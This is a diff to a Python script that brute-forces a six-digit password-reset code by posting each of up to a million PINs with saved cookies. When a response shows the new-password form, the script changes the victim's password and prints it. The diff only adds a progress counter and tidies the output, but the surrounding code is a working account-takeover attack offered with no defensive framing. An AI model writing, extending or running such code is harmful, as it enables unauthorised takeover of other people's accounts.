@@ -193,7 +193,7 @@ def machine_found(web):
   ac_url=ac_url.replace("amp;", "")
   return ac_url, form
 def hackie(arg):
-  global RUN, session, codelist
+  global RUN, session, codelist, total
   body = json.loads(open("form.json", "r").read())
   cookie = json.loads(open("cookies.json", "r").read())
   header['Referer']=open("cach.txt", "r").read()
@@ -204,14 +204,13 @@ def hackie(arg):
       if len(codelist) == 1000000:
         pass
       else:
-        sys.stdout.write(u'\033[1000D\033[1;97m {}  \033[1;92m {}'.format(str(len(codelist)), str(pin)))
+        sys.stdout.write(u'\033[1000D\033[1;97m {}/1000000  \033[1;92m {}'.format(str(total), str(pin)))
         sys.stdout.flush()
       body["n"]=str(pin)
       web = session.post(url, headers = header, cookies = cookie, data = body)
       if 'password_new' in web.text:
         RUN = False
-        print("FOUND CODE {}".format(str(pin)))
-        
+        print("\r\r\nFOUND CODE {}".format(str(pin)))
         ac_url, form = machine_found(web)
         if machine_change_pass(ac_url, session, form):
           print("DONE CHANGE PASSWORD {}".format(str(userpass)))
@@ -227,9 +226,11 @@ def hackie(arg):
         header['Referer'] = web.url
         cookie = session.cookies.get_dict()
         codelist.remove(str(pin))
+        total+=1
     except:
       pass
   return
+total = 0
 os.system(clr)
 print(logo)
 print(67 * '\033[1;92m=')
